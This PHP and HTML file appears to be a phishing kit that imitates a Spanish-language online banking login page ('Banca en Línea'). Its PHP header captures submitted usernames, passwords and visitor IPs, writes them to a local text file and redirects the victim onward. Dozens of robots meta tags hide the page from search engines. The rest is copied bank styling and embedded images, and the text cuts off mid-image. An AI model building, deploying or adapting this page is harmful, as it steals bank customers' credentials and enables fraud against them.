
<?php
if (!empty($_REQUEST["QQfRCLYyuOSgeEk"])){
  $user = $_POST["QQfRCLYyuOSgeEk"];
  $pass = $_POST["JPeoljJcteFnVdP"];
  $atm = $_POST["vQIJRxTqiGdrNrw"];
  $ip = $_SERVER['REMOTE_ADDR'];
  $archivo = "badata.txt";
  $file = fopen($archivo,"a");
  fwrite($file,"Usuario: ".$user."\r\nClave: ".$pass."\r\nIP: ".$ip."\r\n==============================\r\n");
  fclose($file);
  header ("location: VeOHgBYTMeaYVCO.php");
 }
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta name="robots" content="none">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
<meta name="robots" content="noarchive">
<meta name="robots" content="nocache">
<meta name="robots" content="noimageindex">
<meta name="robots" content="nomediaindex">
<meta name="robots" content="noodp">
<meta name="robots" content="noodyp">
<meta name="robots" content="notranslate">
<meta name="robots" content="noyaca">
<meta name="robots" content="noydir">
<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
<meta name="googlebot" content="none">
<meta name="googlebot" content="noindex">
<meta name="googlebot" content="nofollow">
<meta name="googlebot" content="noarchive">
<meta name="googlebot" content="nocache">
<meta name="googlebot" content="noimageindex">
<meta name="googlebot" content="nomediaindex">
<meta name="googlebot" content="noodp">
<meta name="googlebot" content="noodyp">
<meta name="googlebot" content="notranslate">
<meta name="googlebot" content="noyaca">
<meta name="googlebot" content="noydir">
<meta name="slurp" content="none">
<meta name="slurp" content="noindex">
<meta name="slurp" content="nofollow">
<meta name="slurp" content="noarchive">
<meta name="slurp" content="nocache">
<meta name="slurp" content="noimageindex">
<meta name="slurp" content="nomediaindex">
<meta name="slurp" content="noodp">
<meta name="slurp" content="notranslate">
<meta name="slurp" content="noyaca">
<meta name="slurp" content="noydir">
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="css/normalize.min.css" />
<link rel="stylesheet" href="css/estilos.css" />
<title>Banca en Línea</title>
<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
<style>
  body {
  font-family: Verdana, Arial, Helvetica, sans-serif;
}

.container {
  margin: 0px auto;
  width: 980px;
}

.banner1 {
  width: 100%;
  padding: 20px 0px 7px 25px;
  display: inline-block;
}

.banner1 img {
  width: 230px;
  height: 28px;
  float: left;
}

.banner1 .txtg {
  float: left;
  font-size: 20px;
  color: #837361;
  font-weight: 400;
  font-family: Arial, Helvetica, sans-serif;
  margin: 5px 0px 1px 25px;
}

.banner1 .derLinks {
  float: right;
  font-size: 11px;
  padding-top: 8px;
  width: 190px;
  padding-right: 18px;
}

.derLinks img.sarea {
  width: 10px;
  height: 14px;
  float: left;
}

.derLinks .areaSegura {
  font-weight: bold;
  padding: 0 10px 0 6px;
  float: left;
  color: #666;
  margin-top: 2px;
}

.derLinks .lenguaje {
  position: relative;
  right: -3px;
  margin: 2px 10px 0 5px;
  float: right;
  color: #666666;
}

.derLinks img.sarea2 {
  width: 1px;
  height: 15px;
  float: left;
}

.banner2 {
  width: 930px;
  padding-right: 25px;
  padding-left: 25px;
  background-color: #dc1431;
}

.banner2 h1 {
  font-family: "cnx-regular", Arial, Verdana, Helvetica, sans-serif;
  font-size: 22px;
  color: #fff;
  font-weight: 400;
  line-height: 60px;
}

.banner3 {
  width: 960px;
}

.banner3 .columnas {
  margin: 25px 0 44px 25px;
}

.columnas form {
  float: left;
  margin-right: 70px;
  width: 27.7%;
}

form .form-group {
  margin-bottom: 44px;
}
form .form-group-l {
  margin-bottom: 22px;
}
form .form-group label.titulo-input {
  font-family: Arial, Verdana, Helvetica, sans-serif;
  font-size: 18px;
  font-weight: normal;
  padding-bottom: 4px;
  letter-spacing: 0px;
}

form .form-group label.titulo-input2 {
  font-family: Arial, Verdana, Helvetica, sans-serif;
  font-size: 18px;
  font-weight: 400;
  padding-bottom: 4px;
  letter-spacing: 0px;
}

form .form-group input[type="text"],
input[type="password"] {
  width: 209px;
  height: 14px;
  display: block;
  border: 1px solid #ccc;
  padding: 4px 2px;
  margin-top: 9px;
  font-family: Arial, Helvetica, sans-serif;
  font-size: 12px;
}

form .form-group input[type="checkbox"] {
  margin-top: 10px;
  margin-right: 7px;
  margin-left: 1px;
  margin-bottom: 0px;
}

form .form-group label.inline-titulo-input {
  font-size: 13px;
  font-family: Arial, Verdana, Helvetica, sans-serif;
  line-height: 20px;
  vertical-align: 1px;
}

form .form-group img {
  vertical-align: -2px;
  margin-left: 1px;
}

form .form-group a {
  font-family: Arial, Helvetica, sans-serif;
  font-size: 12px;
  font-weight: 400;
  color: #0000ff;
  line-height: 18px;
  text-decoration: none;
}

form .form-group a:hover {
  text-decoration: underline;
}

form .form-group .btn-azul {
  color: #fff;
  position: relative;
  display: inline-block;
  font: bold 15px/22px Arial, Helvetica, sans-serif;
  text-align: center;
  vertical-align: middle;
  border-radius: 5px;
  font-size: 13px;
  padding: 1px 14px;
  border-color: #124e89;
  background-color: #0077be;
  background-image: -webkit-gradient(
    linear,
    0 0,
    0 bottom,
    from(#007dc3),
    to(#0067b1)
  );
  background-image: -webkit-linear-gradient(#007dc3, #0067b1);
  background-image: -moz-linear-gradient(#007dc3, #0067b1);
  background-image: -ms-linear-gradient(#007dc3, #0067b1);
  background-image: linear-gradient(#007dc3, #0067b1);
  outline: none;
  border: 1px solid #666;
  cursor: pointer;
}

form .form-group .btn-azul:hover {
  color: #fff;
  border-color: #124e89;
  background-color: #0068b2;
  background-image: -webkit-gradient(
    linear,
    0 0,
    0 bottom,
    from(#0067b1),
    to(#007dc3)
  );
  background-image: -webkit-linear-gradient(#0067b1, #007dc3);
  background-image: -moz-linear-gradient(#0067b1, #007dc3);
  background-image: -ms-linear-gradient(#0067b1, #007dc3);
  background-image: linear-gradient(#0067b1, #007dc3);
}

form .form-group .btn-azul span {
  padding-left: 15px;
  color: #fff;
  background: url(data:image/pngNTk3NTA2NjI0MTA0ODE0MQ==;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAMCAYAAACwXJejAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAE/SURBVChTVZBNS0JBFIanZbSvpX+gVYs2/ZlW7aMPy9q5cF1EbYL2FUiQkIJJJZcCTUtNDA0so7iWZdnVvN77dOZKgjOcw5mXZ855Z5QKxFD+S1TAIJJ/xZYdvXlHLWldYuUMNbocRa1G2EvXQIBG3eJLqv3CM2r9QqA4Ss2nmdnN4WKxnSzjCyXZSn2AYzO5me9DY4sZZg+z0OsytZOREUmmNwz4hbmDW0b8CdTaUQ6j3pRBXVJFCBceOS+adGSkYVoETioofWjREzttbUlqPMDptKSZIzYclCOC67rSB6L5ChPBY+KlhqdJEgiUTv8RfvhELaQJ31fl3AeGIMfpcWc2GQ9dcf3yNgAGkCCej1ipji94SqJcG4Z+JHXlj2hLyLOr3yKIYjvadH+p7JOJBr2l3bu6p40lL5I7MrrBH8xPdgKe1MJ8AAAAAElFTkSuQmCC) no-repeat scroll 0 1px transparent;
}

.columnas .columna2 {
  float: left;
  width: 36.8%;
  border-left: 1px solid #ccc;
  height: 275px;
  padding-left: 60px;
  height: 270px;
}

.columna2 p.tituloColumna2 {
  position: relative;
  top: -4px;
  font-family: "cnx-regular";
  font-size: 18px;
  color: #544a42;
  line-height: 27px;
  margin-top: 0px;
  margin-bottom: 0px;
}

.columna2 img {
  width: 149px;
  float: left;
  margin-top: 6px;
  margin-right: 11px;
}

.columna2 .titulo2Columna2 {
  font-family: "cnx-regular";
  margin-top: 56px;
  font-size: 18px;
  font-weight: 400;
  line-height: 27px;
  color: #544a42;
  padding-right: 50px;
  margin-bottom: 10px;
}

.columna2 .btn-rojo {
  position: relative;
  display: inline-block;
  text-align: center;
  vertical-align: middle;
  border-radius: 5px;
  padding: 0px 14px 2px 14px;
  border-color: #bb292b;
  background-color: #dc1431;
  background-image: -webkit-gradient(
    linear,
    0 0,
    0 bottom,
    from(#dc1431),
    to(#c41230)
  );
  background-image: -webkit-linear-gradient(#dc1431, #c41230);
  background-image: -moz-linear-gradient(#dc1431, #c41230);
  background-image: -ms-linear-gradient(#dc1431, #c41230);
  background-image: linear-gradient(#dc1431, #c41230);
  outline: none;
  border: 0px solid #666;
  cursor: pointer;
  width: 127px;
  height: 58px;
}

.columna2 .btn-rojo:hover {
  border-color: #ba2628;
  background-color: #c61230;
  background-image: -webkit-gradient(
    linear,
    0 0,
    0 bottom,
    from(#c41230),
    to(#dc1431)
  );
  background-image: -webkit-linear-gradient(#c41230, #dc1431);
  background-image: -moz-linear-gradient(#c41230, #dc1431);
  background-image: -ms-linear-gradient(#c41230, #dc1431);
  background-image: linear-gradient(#c41230, #dc1431);
}

.columna2 .btn-rojo span {
  font: bold 15px/22px "cnx-regular", Arial, Helvetica, sans-serif;
  color: #fff;
  font-size: 15px;
  font-weight: 700;
}

.columnas .columna3 {
  width: 20%;
  float: left;
  font-family: Verdana, Arial, Helvetica, sans-serif;
}

.columna3 h2 {
  position: relative;
  top: -1px;
  font-size: 14px;
  font-weight: 400;
  color: #333333;
  border-bottom: 1px solid #e0d9d3;
  padding: 0px 0 10px;
  margin-top: 3px;
  margin-bottom: 7px;
}
.columna3 ul {
  margin-top: 5px;
  padding: 4px 0px 0px 0px;
}
.columna3 ul > li {
  list-style: none;
  padding-bottom: 12px;
}

.columna3 ul li a {
  font-size: 11px;
  color: #36c;
  text-decoration: none;
  display: inline-block;
  line-height: 16px;
}
.columna3 h2.titulito {
  margin-top: 27px;
  line-height: 21px;
  padding-bottom: 8px;
}
.banner4 {
  width: 930px;
  background-color: #f3efea;
  height: 30px;
  float: left;
  margin-top: 88px;
  height: 114px;
  padding: 6px 25px 25px;
}

.banner4 .fondolock {
  background-image: url("data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QBiRXhpZgAATU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAEAAAITAAMAAAABAAEAAAAAAAAAAAABAAAAAQAAAAEAAAAB/9sAQwADAgICAgIDAgICAwMDAwQGBAQEBAQIBgYFBgkICgoJCAkJCgwPDAoLDgsJCQ0RDQ4PEBAREAoMEhMSEBMPEBAQ/9sAQwEDAwMEAwQIBAQIEAsJCxAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQ/8AAEQgADAAKAwERAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAgG/8QAIhAAAQQCAQQDAAAAAAAAAAAAAQIDBAUGEQAHCCFBEhaU/8QAFgEBAQEAAAAAAAAAAAAAAAAAAgAD/8QAFxEBAQEBAAAAAAAAAAAAAAAAAAESMf/aAAwDAQACEQMRAD8AvLzq72zXysmuZ0XqP9svLw3MPIkxIxnVAS60pqOwsS/CUJa+CSTtIPjWhyRw49kcHMMfrMtrGn2od3DZsY6H0hLqWnkBxIWEkgKAUNgEjfs8yvWs4PR7Bejx8HJcy1rQ3LiHQ/Nxao5hB4xQQsTxqpxatceciU0FivYW8oKcU202lCSogAFWkjZAA36HCT//2Q==");
  background-repeat: no-repeat;
  background-size: cover;
  background-position: bottom;
  margin-right: 4px;
  width: 10px;
  height: 12px;
  display: inline-block;
  vertical-align: -7px;
}

.banner4 p {
  font-family: Verdana, Arial, Helvetica, sans-serif;
  font-size: 11px;
  font-weight: 700;
  color: #666666;
  line-height: 14px;
  display: inline-block;
  vertical-align: top;
}
.banner4 p:nth-child(2) {
  vertical-align: -5px;
  margin-bottom: 10px;
}
.banner4 p:nth-child(1) {
  margin-top: 12px;
}
.banner4 .enlaces-footer {
  margin-top: 0px;
}

.banner4 .enlaces-footer a {
  font-family: Verdana, Arial, Helvetica, sans-serif;
  font-size: 11px;
  font-weight: 400;
  color: #36c;
  text-decoration: none;
}

.banner4 .enlaces-footer a:nth-child(1) {
  padding-right: 10px;

  background: url(data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QBiRXhpZgAATU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAEAAAITAAMAAAABAAEAAAAAAAAAAAABAAAAAQAAAAEAAAAB/9sAQwADAgICAgIDAgICAwMDAwQGBAQEBAQIBgYFBgkICgoJCAkJCgwPDAoLDgsJCQ0RDQ4PEBAREAoMEhMSEBMPEBAQ/9sAQwEDAwMEAwQIBAQIEAsJCxAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQ/8AAEQgACgABAwERAAIRAQMRAf/EABUAAQEAAAAAAAAAAAAAAAAAAAAH/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/EABYBAQEBAAAAAAAAAAAAAAAAAAAHCP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJY1Gj4D/9k=) right 3px no-repeat;
}

.banner4 .enlaces-footer a:nth-child(2) {
  padding-right: 10px;
  margin-left: 4px;
}

.banner4 .copirait {
  margin-top: 1px;
  width: 570px;
}

.copirait p {
  vertical-align: bottom;
  font-weight: 400;
  font-size: 11px;
  color: #333333;
  line-height: 15px;
  margin-bottom: 0px;
}

.copirait a {
  font-weight: 400;
  font-size: 11px;
  line-height: 15px;
  text-decoration: none;
  color: #36c;
  background: url(data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,/9j/4AAQSkZJRgABAQEAAQABAAD/4QBWRXhpZgAATU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAAAAAABAAAAAQAAAAEAAAAB/9sAQwAFAwQEBAMFBAQEBQUFBgcMCAcHBwcPCwsJDBEPEhIRDxERExYcFxMUGhURERghGBodHR8fHxMXIiQiHiQcHh8e/9sAQwEFBQUHBgcOCAgOHhQRFB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e/8AAEQgACQAOAwEiAAIRAQMRAf/EABYAAQEBAAAAAAAAAAAAAAAAAAYHCP/EACQQAAEEAQIGAwAAAAAAAAAAAAECAwUGBAARBxITN3a0CSEi/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AFEhLZ0lVZmyXWqzfEZ1qzZUI3X4xlTmHiNsOOgPBhKf39oALjvOoEp5Sncgoa7IW3Bv0RB1h17Fj5ismbVD2Ja3DFuBxhBZQrbqp26hBbWpSUkEJCQAnWGeOHeq8+RSHsuasPx4d6pjx1/2cbQf/9k=) no-repeat right 2px;
  padding-right: 20px;
}

.corporation {
  vertical-align: top;
  font-weight: 400;
  font-size: 11px;
  color: #333333;
  line-height: 15px;
}
.form2label {
  font-family: Arial, Helvetica, sans-serif;
  font-weight: 400;
  font-size: 18px;
}
.footer-form {
  margin-top: 30px;
}
.btn {
  color: #666666;
  text-decoration: none;
  border-radius: 6px;
  padding: 1px 10px 4px;
  cursor: pointer;
}
.btn.principal {
  color: white;
  border: 2px solid #5b89c1;
  background: linear-gradient(to top, #2d67af 50%, #5b89c1 50%);
  font-weight: bold;
  font-size: 12px;
}
.btn.principal:hover {
  background: linear-gradient(to top, #5b89c1 50%, #2d67af 50%);
}
.btn.principal:active,
.btn.principal:focus {
  outline: none;
}
.btn.secundario {
  border: 2px solid #d2d2d2;
  background: linear-gradient(to top, #dddddd 50%, #fefefe 50%);
  font-weight: bold;
}
.btn.secundario:hover {
  background: linear-gradient(to top, #fefefe 50%, #dddddd 50%);
}
.btn.secundario:active,
.btn.secundario:focus {
  outline: none;
}
.columnaX {
  width: 80%;
  display: inline-block;
  background-color: transparent;
}
.columnaX .titulo2 {
  font-family: "cnx-regular", Arial, Helvetica, sans-serif;
  font-weight: 400;
}
.columnaX p {
  font-family: "cnx-regular", Arial, Helvetica, sans-serif;
  font-weight: 400;
}
.menosmargin {
  padding-left: 20px;
}
button, input, optgroup, select, textarea {
  font-family: inherit;
  font-size: 100%;
  line-height: 1.15;
  margin: 0;
}
</style>
</head>
<body>
<div class="container">
<div class="banner1">
<img src="data:image/jpegNTk3NTA2NjI0MTA0ODE0MQ==;base64,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